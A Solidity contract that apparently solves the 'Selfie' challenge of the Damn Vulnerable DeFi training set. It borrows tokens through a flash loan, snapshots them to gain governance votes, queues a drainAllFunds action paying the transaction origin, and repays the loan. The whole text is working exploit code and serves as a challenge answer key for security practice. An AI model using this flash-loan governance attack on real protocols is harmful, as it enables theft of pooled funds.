// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieSolution {
    SelfiePool public immutable selfiePool;
    SimpleGovernance public immutable simpleGovernance;
    
    constructor (address _selfiePool, address _simpleGovernance) {
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
    }

    function attack() public {
        selfiePool.flashLoan(1500000 ether);
    }

    function receiveTokens(address _token, uint256 _amount) external {
        // tx.origin: attacker
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);
        token.snapshot();
        simpleGovernance.queueAction(address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", tx.origin), 0);
        token.transfer(address(selfiePool), _amount);
    }
}